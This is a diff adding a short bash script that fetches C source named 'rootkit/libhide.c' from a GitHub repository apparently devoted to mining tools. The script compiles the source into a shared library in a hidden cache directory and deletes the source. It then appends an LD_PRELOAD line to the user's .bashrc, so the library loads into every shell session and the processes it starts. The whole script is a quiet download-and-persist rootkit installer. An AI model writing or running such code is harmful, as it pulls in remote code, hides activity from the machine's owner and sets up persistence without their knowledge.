@@ -1,0 +1,15 @@
+#!/bin/bash
+
+URL="https://raw.githubusercontent.com/derailment/mining_armory/refs/heads/main/rootkit/libhide.c"
+LIB_NAME="libhide.so"
+INSTALL_DIR="$HOME/.cache/lib"
+INSTALL_PATH="$INSTALL_DIR/$LIB_NAME"
+
+mkdir -p $INSTALL_DIR
+
+wget -q $URL -O /tmp/libhide.c
+gcc -shared -fPIC /tmp/libhide.c -o $INSTALL_PATH -ldl
+rm /tmp/libhide.c
+chmod 644 $INSTALL_PATH
+
+echo "export LD_PRELOAD=$INSTALL_PATH" >> $HOME/.bashrc
